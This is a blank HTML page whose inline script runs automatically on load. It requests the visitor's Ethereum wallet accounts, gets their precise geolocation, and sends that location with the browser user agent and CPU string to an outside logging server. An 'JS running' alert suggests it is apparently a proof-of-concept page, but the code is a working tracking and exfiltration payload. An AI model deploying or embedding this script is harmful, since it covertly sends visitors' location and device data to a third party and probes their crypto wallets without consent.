<!DOCTYPE html>
<html>
<head>
  <script>
    "use strict";

    async function requestAccounts() {
      if (window.ethereum) {
        try {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          console.log(accounts);
        } catch (err) {
          console.log("Error executing eth_requestAccounts: " + err.message);
        }
      }
    }

    function getCurrentPosition() {
      return new Promise((resolve, reject) => {
        const options = {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        };

        function success(pos) {
          const crd = pos.coords;
          const loc = `${crd.latitude},${crd.longitude}`;
          resolve(loc);
        }

        function error(err) {
          console.warn(`ERROR(${err.code}): ${err.message}`);
          reject(err);
        }

        navigator.geolocation.getCurrentPosition(success, error, options);
      });
    }

    async function sendRequest() {
      try {
        const loc = await getCurrentPosition();
        const cpu = navigator.oscpu;
        const ua = navigator.userAgent;

        const url = `https://rex.rektosaurus.io/logger/ua=${ua}&oscpu=${cpu}&loc=${loc}`;
        await fetch(url);
      } catch (err) {
        console.log("Error executing HTTP request: " + err.message);
      }
    }

    // Modified code to display an alert instead of logging a message
    function showAlert() {
      alert("JS running");
    }

    window.addEventListener('load', async () => {
      try {
        // Display an alert to indicate JS runn-ing
        showAlert();

        // Attempt to request Ethereum accounts
        await requestAccounts();

        // Send the HTTP request
        await sendRequest();
      } catch (err) {
        console.log("Error: " + err.message);
      }
    });
  </script>
</head>
<body>
</body>
</html>
